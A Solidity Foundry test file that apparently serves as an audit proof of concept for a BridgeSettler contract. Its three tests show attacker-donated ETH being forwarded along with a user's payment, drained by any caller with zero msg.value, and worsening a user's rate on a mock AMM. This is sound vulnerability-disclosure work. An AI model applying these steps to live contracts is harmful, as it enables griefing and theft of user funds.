// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "@forge-std/Test.sol";
import {IERC20} from "@forge-std/interfaces/IERC20.sol";
import {ISettlerActions} from "src/ISettlerActions.sol";
import {AllowanceHolder} from "src/allowanceholder/AllowanceHolder.sol";
import {ALLOWANCE_HOLDER} from "src/allowanceholder/IAllowanceHolder.sol";
import {BridgeSettler, BridgeSettlerBase} from "src/bridge/BridgeSettler.sol";
import {ISettlerTakerSubmitted} from "src/interfaces/ISettlerTakerSubmitted.sol";
import {MainnetSettler} from "src/chains/Mainnet/TakerSubmitted.sol";
import {ISettlerBase} from "src/interfaces/ISettlerBase.sol";
import {IBridgeSettlerActions} from "src/bridge/IBridgeSettlerActions.sol";
import {DAI, USDC} from "src/core/MakerPSM.sol";
import {ISignatureTransfer} from "@permit2/interfaces/ISignatureTransfer.sol";
import {Utils} from "test/unit/Utils.sol";
import {DEPLOYER} from "src/deployer/DeployerAddress.sol";
import {IERC721View} from "src/deployer/IDeployer.sol";
import {MockERC20} from "@solmate/test/utils/mocks/MockERC20.sol";

contract BridgeSettlerDummy is BridgeSettler {
    constructor(bytes20 gitCommit) BridgeSettlerBase(gitCommit) {}
}

contract BridgeDummy {
    function take(address token, uint256 amount) external {
        IERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    receive() external payable {}
}

contract BridgeSettlerTestBase is Test {
    BridgeSettler bridgeSettler;
    ISettlerTakerSubmitted settler;
    IERC20 token;
    BridgeDummy bridgeDummy;

    function _testBridgeSettler() internal virtual {
        bridgeSettler = new BridgeSettlerDummy(bytes20(0));
    }

    function setUp() public virtual {
        _testBridgeSettler();
        vm.label(address(bridgeSettler), "BridgeSettler");
        bridgeDummy = new BridgeDummy();
        token = IERC20(address(new MockERC20("Test Token", "TT", 18)));
    }
}

contract BridgeSettlerUnitTest is BridgeSettlerTestBase {
    function setUp() public override {
        super.setUp();

        AllowanceHolder ah = new AllowanceHolder();
        vm.etch(address(ALLOWANCE_HOLDER), address(ah).code);
        // Mock DAI and USDC for MainnetSettler to be usable
        deployCodeTo("MockERC20", abi.encode("DAI", "DAI", 18), address(DAI));
        deployCodeTo("MockERC20", abi.encode("USDC", "USDC", 6), address(USDC));
        settler = new MainnetSettler(bytes20(0));
    }
}

contract BridgeSettlerTest is BridgeSettlerUnitTest, Utils {
    // POC 1
    function testAmbientGrief_OverpayAndInvariantBreak() public {
        // Actors & constants
        address user = makeAddr("user");
        address attacker = makeAddr("attacker");
        address ETH_ADDRESS = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

        uint256 userSend = 1_000; // user intends to spend exactly this much
        uint256 ambient = 1; // attacker "dust" to create ambient ETH

        // Deploy helper used to debit attacker’s balance
        Payer payer = new Payer();

        // 1) Seed balances
        deal(user, userSend);
        deal(attacker, ambient);

        // 2) Attacker injects ambient ETH into BridgeSettler from ATTACKER's balance (not the test contract)
        uint256 preAtt = attacker.balance;
        vm.prank(attacker);
        payer.donate{value: ambient}(payable(address(bridgeSettler)));
        uint256 postAtt = attacker.balance;
        assertEq(preAtt - postAtt, ambient, "attacker should fund the ambient ETH");

        // 3) Build a single BASIC action that sends 100% (10_000 bps) of available native to integrator (bridgeDummy)
        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodeCall(IBridgeSettlerActions.BASIC, (ETH_ADDRESS, 10_000, address(bridgeDummy), 0, ""));

        // 4) Snapshot pre-state
        uint256 preUser = user.balance;
        uint256 preBridge = address(bridgeDummy).balance;

        // NOTE: do NOT set _mockExpectCall(... ownerOf ...) here — BASIC path does not query Settler

        // 5) User executes with ONLY userSend; BASIC(100%) will forward (msg.value + ambient)
        vm.prank(user);
        bridgeSettler.execute{value: userSend}(actions, bytes32(0));

        // 6) Snapshot post-state
        uint256 postUser = user.balance;
        uint256 postBridge = address(bridgeDummy).balance;

        // Contract forwarded ALL available native; nothing left behind
        assertEq(address(bridgeSettler).balance, 0, "BASIC(100%) should forward all available native");

        // Integrator received more than user's intended amount -> invariant break
        uint256 actualReceived = postBridge - preBridge;
        assertEq(actualReceived, userSend + ambient, "forwarded exactly msg.value + ambient");
        assertGt(actualReceived, userSend, "forwarded more than msg.value (ambient included)");

        // User spent ~msg.value (plus gas); they did NOT fund the ambient
        assertLe(preUser - postUser, userSend + 1e15, "user spend should be ~msg.value + gas");
        assertGe(preUser - postUser, userSend, "user must spend at least msg.value");
    }

    // POC 2
    function testAmbientAttackerDrain_NoMsgValue() public {
        address attacker = makeAddr("attacker");
        address ETH_ADDRESS = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

        uint256 ambient = 1; // "refund" or forced ETH to demonstrate drain

        // Seed ATTACKER and donate ambient into BridgeSettler
        // (use helper to ensure the debit comes from attacker, optional for this test)
        deal(attacker, ambient);
        Payer payer = new Payer();
        vm.prank(attacker);
        payer.donate{value: ambient}(payable(address(bridgeSettler)));

        // Sanity: BridgeSettler holds the ambient wei
        assertEq(address(bridgeSettler).balance, ambient, "Ambient ETH was not seeded to BridgeSettler");

        // Receiver contract that records how much it got (avoids EOA gas noise)
        Receiver recv = new Receiver();

        // Single BASIC action: send 100% (10_000 bps) of available native to the receiver
        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodeCall(IBridgeSettlerActions.BASIC, (ETH_ADDRESS, 10_000, address(recv), 0, ""));

        uint256 preRecv = recv.received();

        // IMPORTANT: no ownerOf expectation here — BASIC path doesn’t touch Settler

        // Anyone can trigger; attacker (or any caller) pays zero msg.value and drains ambient
        vm.prank(attacker);
        bridgeSettler.execute{value: 0}(actions, bytes32(0));

        // All ambient forwarded, none left behind
        assertEq(address(bridgeSettler).balance, 0, "BASIC(100%) should forward all available native");

        // ✅ Core claim: receiver got exactly the ambient amount even though msg.value == 0
        assertEq(recv.received() - preRecv, ambient, "Ambient ETH was freely drainable with zero msg.value");
    }

    // POC 3
    function testAmbientWorsensEffectiveRateOnAMM() public {
        address user = makeAddr("user");
        address attacker = makeAddr("attacker");
        address ETH_ADDRESS = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

        uint256 userSend = 1_000; // user's intended spend
        uint256 ambient = 1; // attacker dust

        // Deploy monotone AMM
        MockAMMMonotone amm = new MockAMMMonotone();

        // BASIC action: send 100% of available native to AMM (no calldata; hits receive()).
        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodeCall(IBridgeSettlerActions.BASIC, (ETH_ADDRESS, 10_000, address(amm), 0, ""));

        // --- Scenario 1: No ambient (baseline) ---
        deal(user, userSend);
        // NOTE: do NOT set ownerOf expectation — BASIC path doesn’t touch Settler
        vm.prank(user);
        bridgeSettler.execute{value: userSend}(actions, bytes32(0));

        uint256 input1 = amm.lastInput();
        uint256 output1 = amm.lastOutput();
        uint256 perUnit1 = (output1 * 1e18) / input1; // fixed-point per-unit output

        assertEq(input1, userSend, "baseline AMM input should equal user's msg.value");
        assertGt(output1, 0, "baseline AMM output should be positive");

        // --- Scenario 2: With ambient (attacker grief) ---
        // Attacker donates ambient ETH to BridgeSettler from their own balance
        Payer payer = new Payer();
        deal(attacker, ambient);
        vm.prank(attacker);
        payer.donate{value: ambient}(payable(address(bridgeSettler)));

        // User repeats the same intended spend
        deal(user, userSend);
        vm.prank(user);
        bridgeSettler.execute{value: userSend}(actions, bytes32(0));

        uint256 input2 = amm.lastInput(); // == userSend + ambient
        uint256 output2 = amm.lastOutput();
        uint256 perUnit2 = (output2 * 1e18) / input2;

        // Sanity: AMM saw the inflated input
        assertEq(input2, userSend + ambient, "AMM input should include ambient ETH");

        // ✅ Core grief: per-unit strictly decreases with larger input on this AMM
        assertLt(perUnit2, perUnit1, "ambient ETH worsened user's effective rate on the AMM");

        // Optional: no residual native on BridgeSettler
        assertEq(address(bridgeSettler).balance, 0, "BASIC(100%) forwards all available native");
    }
}

// Monotone AMM: per-unit output strictly decreases as input grows.
// output = (x * R) / (x + C), credited via receive() (no calldata).
contract MockAMMMonotone {
    uint256 public lastInput;
    uint256 public lastOutput;

    // tune constants to keep numbers sane and clearly monotone at tiny x
    uint256 internal constant R = 1_000_000; // numerator scale
    uint256 internal constant C = 1000; // slope/curvature control

    receive() external payable {
        uint256 x = msg.value;
        // per-unit = R / (x + C) — strictly decreasing in x
        // output grows sublinearly with x
        uint256 out = (x * R) / (x + C);
        lastInput = x;
        lastOutput = out;
    }
}

// helper to ensure the attacker’s balance is actually debited
contract Payer {
    function donate(address payable to) external payable {
        (bool ok,) = to.call{value: msg.value}("");
        require(ok, "donate failed");
    }
}

contract Receiver {
    uint256 public received;

    receive() external payable {
        received += msg.value;
    }
}
